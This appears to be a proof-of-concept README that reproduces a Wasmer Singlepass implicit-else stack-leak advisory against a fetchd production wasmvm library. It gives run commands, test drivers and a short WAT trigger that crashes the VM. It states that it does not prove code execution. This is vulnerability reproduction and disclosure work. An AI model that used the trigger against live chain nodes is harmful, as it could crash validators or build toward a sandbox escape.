# PoC — fetchhub-4 / fetchd v0.15.1 — cosmwasm-vm 3.0.10-rc.3 (Wasmer 7.4.2 Singlepass)

Reproduces GHSA-v2h8-j899-r676 against the **exact production binary artifact**
(`fetchai/priv_wasmvm_sec@d89faf180d3fb5de09b4ba59099844cc0a7a2632`,
tag `v3.0.8-rc.3`, `libwasmvm.x86_64.so`,
sha256 `0b18713c01c57a12d956614c98de6bd247d29b0649e7fa91a53b9444ce80ac32`)
through the same C ABI that `fetchd` calls from `x/wasm`
(`init_cache → store_code(checked=true) → instantiate → execute`).

## 0. Get the exact library

The `.so` is committed inside the pinned Go module (19 MB), so it is not stored in
this repo. Extract it from the module the chain links:

```bash
GOPRIVATE= go mod download github.com/fetchai/priv_wasmvm_sec/v3@v3.0.8-rc.3
DIR=$(GOPRIVATE= go list -m -f '{{.Dir}}' github.com/fetchai/priv_wasmvm_sec/v3)
cp "$DIR/internal/api/libwasmvm.x86_64.so" ./libwasmvm.x86_64.so
sha256sum ./libwasmvm.x86_64.so
# 0b18713c01c57a12d956614c98de6bd247d29b0649e7fa91a53b9444ce80ac32
```

Static (musl) release path used by the v0.15.1 docker image / release tarball is
verified in `Makefile:171-190`; the decompressed archives hash to
`ab1a878e…97497` (x86_64) / `cc917523…54235` (aarch64).

## 1. Requirements

```bash
python3 -m pip install --break-system-packages wasmtime
export LIBWASMVM_PATH=$PWD/libwasmvm.x86_64.so
```

## 2. Run

```bash
# single execution: upload (store_code) + instantiate + execute
python3 child_probe.py            # reads cfg.json

# full differential suite
python3 sweep_controls.py         # 200k iters, trigger + controls
python3 bisect_threshold.py       # exact first-trap iteration
python3 bisect_prefix.py          # threshold vs register pressure
python3 sweep_variants.py         # body/condition/prefix variants
```

`gen_wat4.py` builds the WAT. The module contains, inside a `loop`:

```wat
local.get $value      ;; x33  (32 prefix values + 1 block parameter)
local.get $condition
if (type $pass)       ;; (func (param i64) (result i64))
end                   ;; <-- else omitted: implicit else
```

This is valid per the multi-value proposal (block signature `[i64] -> [i64]`),
passes CosmWasm `check_wasm` (multi-value is enabled in
`packages/vm/src/parsed_wasm.rs:82-87`), and is lowered by
`wasmer-compiler-singlepass` 7.4.2 with the implicit-else defect.

## 3. Observed results

See `logs/`. Summary:

| case | 200k iters | 131018 iters |
|---|---|---|
| implicit else, condition 0 | TRAP `call stack exhausted` | TRAP |
| implicit else, condition 1 | OK | — |
| explicit else, condition 0 | OK | OK |
| no block param | OK | — |
| 0..2 prefix values | OK | — |

Threshold 131018 × 8 B = 1,048,144 B ≈ 1 MiB = `DEFAULT_STACK_SIZE`
(`lib/vm/src/trap/traphandlers.rs:1335` in wasmer 7.4.2). The leak is exactly
8 bytes per execution of the false arm.

## 4. What is proven / not proven

Proven locally: the production binary accepts the module, compiles and runs it,
and the false arm leaks native RSP by 8 bytes per execution, deterministically
reaching the guard page. Upstream declared this defect a sandbox escape with
native code execution (GHSA-v2h8-j899-r676, CWA-2026-006 follow-up), and the
regression test in the fix (`implicit_else_reclaims_inputs`) asserts the same
behaviour we reproduce.

Not proven here: a weaponised control-flow hijack. The probes in
`child_probe.py`/`gen_wat7.py` (stack arguments, 50-arg calls after drift) show
caller and callee remain RSP-consistent, so a full exploit needs the
stack-layout-dependent step described by the reporter. No claim of RCE is made
from this harness alone.

## 5. Files

- `harness2.py` — ctypes binding to the wasmvm C ABI (dummy DB/API/Querier vtables).
- `gen_wat4.py` — WAT generator (implicit/explicit else, prefix/param counts, body variants).
- `gen_wat7.py` — two-phase drift probe (drift then 50-arg call).
- `child_probe.py` / `child_drift.py` — subprocess drivers.
- `sweep_controls.py`, `sweep_variants.py`, `bisect_threshold.py`, `bisect_prefix.py` — test drivers.
- `logs/` — captured outputs quoted in the report.
